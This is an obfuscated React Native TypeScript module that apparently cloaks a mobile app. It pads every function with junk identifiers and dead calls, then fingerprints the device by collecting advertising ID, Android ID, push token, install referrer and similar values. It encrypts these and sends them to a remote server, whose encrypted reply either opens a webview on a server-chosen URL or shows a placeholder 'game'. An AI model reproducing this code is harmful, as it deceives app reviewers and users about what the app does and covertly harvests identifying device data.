import {
  Utils,
  yrgagiwotyfxolypSendInitPayload,
  yrgagiwotyfxolypNormalizeWorkerBaseUrl,
} from './UtyrgagiwotyfxolypilService';
import {
  yrgagiwotyfxolypEncrypt as cryptoEncrypt,
  yrgagiwotyfxolypDecrypt as cryptoDecrypt,
} from './CrypyrgagiwotyfxolyptoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finyrgagiwotyfxolypKey } from './constants/constyrgagiwotyfxolypntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  yrgagiwotyfxolypInitTarget,
  yrgagiwotyfxolypAppenndSendId,
  yrgagiwotyfxolypGetAndroidId,
  yrgagiwotyfxolypGetAndroidUserAAgent,
  yrgagiwotyfxolypGetAppIdenier,
  yrgagiwotyfxolypGetAppVersion,
  yrgagiwotyfxolypInitializationRuntime,
} from './initializationSharyrgagiwotyfxolyped';
import { yrgagiwotyfxolypViewportShow } from './yrgagiwotyfxolypViewportHost';

export async function yrgagiwotyfxolypInitStep(): Promise<InitializationState | null> {
  void yrgagiwotyfxolypOfferResolveObfV7HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV7SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV7ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV8HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV8SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV8ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV9HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV9SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV9ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV10HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV10SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV10ClampMod(7, 5);

  void yrgagiwotyfxolypOfferResolveObfV5HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV5SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV5ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV6HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV6SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV6ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV3HashMix('xy');
  void yrgagiwotyfxolypOffObfV3SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV3ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV4HashMix('xy');
  void yrgagiwotyfxolypOffObfV4SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV4ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  void yrgagiwotyfxolypMixSeed(3, 7);
  void yrgagiwotyfxolypFoldRange([1, 2, 3]);
  void yrgagiwotyfxolypClampSpan(5, 0, 10);

  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.yrgagiwotyfxolypGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const appId = await yrgagiwotyfxolypGetAppIdenier();
    const userAgent = await yrgagiwotyfxolypGetAndroidUserAAgent();
    const androidId = await yrgagiwotyfxolypGetAndroidId();
    const appVersion = await yrgagiwotyfxolypGetAppVersion();
    const workerBaseUrl = yrgagiwotyfxolypNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = yrgagiwotyfxolypInitializationRuntime.DevyrgagiwotyfxolypiceId;

    const namingValue = yrgagiwotyfxolypInitializationRuntime.FinyrgagiwotyfxolyplNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      yrgagiwotyfxolypInitializationRuntime.adyrgagiwotyfxolypId ?? '',
      yrgagiwotyfxolypInitializationRuntime.pusyrgagiwotyfxolyphToken ?? '',
      yrgagiwotyfxolypInitializationRuntime.instyrgagiwotyfxolypallRef ?? '',
      yrgagiwotyfxolypInitializationRuntime.FinyrgagiwotyfxolyplOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await yrgagiwotyfxolypSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.yrgagiwotyfxolypSetUserBlocke(1);
        await yrgagiwotyfxolypUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await yrgagiwotyfxolypOnInitResponse(responseText);
    } catch (rpcError) {
      void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
      void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
      void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
      void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
      void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
      void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
      await yrgagiwotyfxolypUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
    void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
    await yrgagiwotyfxolypUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function yrgagiwotyfxolypOnInitResponse(responseText: string): Promise<InitializationState> {
  void yrgagiwotyfxolypOfferResolveObfV7HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV7SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV7ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV8HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV8SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV8ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV9HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV9SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV9ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV10HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV10SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV10ClampMod(7, 5);

  void yrgagiwotyfxolypOfferResolveObfV5HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV5SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV5ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV6HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV6SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV6ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV3HashMix('xy');
  void yrgagiwotyfxolypOffObfV3SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV3ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV4HashMix('xy');
  void yrgagiwotyfxolypOffObfV4SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV4ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  void yrgagiwotyfxolypMixSeed(3, 7);
  void yrgagiwotyfxolypFoldRange([1, 2, 3]);
  void yrgagiwotyfxolypClampSpan(5, 0, 10);

  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
      void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
      void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
      void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
      void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
      void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.yrgagiwotyfxolypSetUserBlocke(1);
      await yrgagiwotyfxolypUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.yrgagiwotyfxolypSetUserBlocke(1);
      await yrgagiwotyfxolypUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finyrgagiwotyfxolypKey, redirectUrlInitial);

      const finalUrl = yrgagiwotyfxolypAppenndSendId(
        redirectUrlInitial,
        yrgagiwotyfxolypInitializationRuntime.penyrgagiwotyfxolypdingSendId,
      );

      const success = await yrgagiwotyfxolypViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: yrgagiwotyfxolypInitTarget.webview,
      };
    }

    await yrgagiwotyfxolypUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: yrgagiwotyfxolypInitTarget.game,
    };
  } catch (error) {
    void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
    void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
    await yrgagiwotyfxolypUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function yrgagiwotyfxolypUnsubscribeFirebase(reason?: string): Promise<void> {
  void yrgagiwotyfxolypOfferResolveObfV7HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV7SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV7ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV8HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV8SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV8ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV9HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV9SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV9ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV10HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV10SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV10ClampMod(7, 5);

  void yrgagiwotyfxolypOfferResolveObfV5HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV5SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV5ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolveObfV6HashMix('xy');
  void yrgagiwotyfxolypOfferResolveObfV6SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolveObfV6ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV3HashMix('xy');
  void yrgagiwotyfxolypOffObfV3SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV3ClampMod(7, 5);
  void yrgagiwotyfxolypOffObfV4HashMix('xy');
  void yrgagiwotyfxolypOffObfV4SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOffObfV4ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  void yrgagiwotyfxolypMixSeed(3, 7);
  void yrgagiwotyfxolypFoldRange([1, 2, 3]);
  void yrgagiwotyfxolypClampSpan(5, 0, 10);

  void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
  void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
  void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
  void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    yrgagiwotyfxolypInitializationRuntime.pusyrgagiwotyfxolyphToken = '';
  } catch (error) {
    void yrgagiwotyfxolypOfferResolvObfV1HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV1SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV1ClampMod(7, 5);
    void yrgagiwotyfxolypOfferResolvObfV2HashMix('xy');
    void yrgagiwotyfxolypOfferResolvObfV2SumOdds([1, 3, 5]);
    void yrgagiwotyfxolypOfferResolvObfV2ClampMod(7, 5);
    yrgagiwotyfxolypInitializationRuntime.pusyrgagiwotyfxolyphToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v5 */

/* obfuscation-batch:v6 */

function yrgagiwotyfxolypOfferResolvObfV1HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 17) % 997, 0);
}

function yrgagiwotyfxolypMixSeed(a: number, b: number): number {
return ((a % (b || 1)) + b) % (b || 1);
}

function yrgagiwotyfxolypOffObfV3SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 5, 0);
}

function yrgagiwotyfxolypOffObfV4SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function yrgagiwotyfxolypOfferResolvObfV2HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 19) % 991, 0);
}

function yrgagiwotyfxolypOfferResolvObfV1ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function yrgagiwotyfxolypFoldRange(nums: number[]): number {
return nums.reduce((acc, n) => acc + n, 0);
}

function yrgagiwotyfxolypOffObfV3ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function yrgagiwotyfxolypOffObfV4ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function yrgagiwotyfxolypOfferResolvObfV2ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function yrgagiwotyfxolypOfferResolvObfV2SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 3, 0);
}

function yrgagiwotyfxolypOffObfV3HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 23) % 983, 0);
}

function yrgagiwotyfxolypOffObfV4HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function yrgagiwotyfxolypOfferResolvObfV1SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n, 0);
}

function yrgagiwotyfxolypClampSpan(n: number, lo: number, hi: number): number {
return n < lo ? lo : n > hi ? hi : n;
}

function yrgagiwotyfxolypOfferResolveObfV5HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 31) % 971, 0);
}

function yrgagiwotyfxolypOfferResolveObfV5SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 11, 0);
}

function yrgagiwotyfxolypOfferResolveObfV5ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v6 */
function yrgagiwotyfxolypOfferResolveObfV6HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 37) % 983, 0);
}

function yrgagiwotyfxolypOfferResolveObfV6SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 13, 0);
}

function yrgagiwotyfxolypOfferResolveObfV6ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v7 */
function yrgagiwotyfxolypOfferResolveObfV7HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 41) % 989, 0);
}

function yrgagiwotyfxolypOfferResolveObfV7SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 17, 0);
}

function yrgagiwotyfxolypOfferResolveObfV7ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v8 */
function yrgagiwotyfxolypOfferResolveObfV8HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 43) % 991, 0);
}

function yrgagiwotyfxolypOfferResolveObfV8SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 19, 0);
}

function yrgagiwotyfxolypOfferResolveObfV8ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v9 */
function yrgagiwotyfxolypOfferResolveObfV9HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 47) % 993, 0);
}
function yrgagiwotyfxolypOfferResolveObfV9SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 23, 0);
}
function yrgagiwotyfxolypOfferResolveObfV9ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v10 */
function yrgagiwotyfxolypOfferResolveObfV10HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 53) % 991, 0);
}
function yrgagiwotyfxolypOfferResolveObfV10SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 29, 0);
}
function yrgagiwotyfxolypOfferResolveObfV10ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}
